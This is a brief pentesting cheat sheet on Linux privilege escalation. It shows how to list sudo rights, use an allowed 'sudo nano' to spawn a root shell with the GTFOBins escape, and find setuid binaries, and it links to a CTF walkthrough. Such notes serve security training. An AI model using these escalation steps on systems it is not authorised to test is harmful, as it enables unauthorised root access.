# Privilege Escalation

 * [Resources](#resources)
 * [Finding Escalation Vectors](#finding-privilege-escalation-vectors)
   * [List all commands you can use sudo with](#list-all-commands-you-can-use-sudo-with)
   * [Find Binaries with SUID bit set](#find-binaries-with-suid-bit-set)

## Resources
|URL|Descriptions|
|---|---|
|[GTFO Bins](https://gtfobins.github.io/)|GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.|
|[Spawning a TTY Shell](https://netsec.ws/?p=337)|Often during pen tests you may obtain a shell without having tty, yet wish to interact further with the system. Here are some commands which will allow you to spawn a tty shell.|


## Privilege Escalation Vectors

### List all commands you can use sudo with

List the allowed (and forbidden) commands for the invoking user ([sudo(8) - Linux man page](https://linux.die.net/man/8/sudo))

```bash
sudo -l
```

<details>
<summary>Read More</summary>

**Example**

```bash
$ sudo -l
Matching Defaults entries for user on host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User may run the following commands:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

 * [gtfobins/nano](https://gtfobins.github.io/gtfobins/nano/)

```
sudo nano
```

Press `^R` (`ctrl` + `R`) to `Read Files`

Press `^X` (`ctrl` + `X`) to `Execute Command`

```bash
Command to execute: reset; sh 1>&0 2>&0
```

</details>

### Find binaries with setuid bit set

Find all files which have the [setuit bit](https://www.computerhope.com/jargon/s/setuid.htm) set

```bash
find / -perm -4000
```
or
```bash
find / -perm -u=s -type f 2>/dev/null
```

**Example**

 * [Mr Robot - Privilege Escalation II](../walkthroughs/mr-robot.md#privilege-escalation-ii)
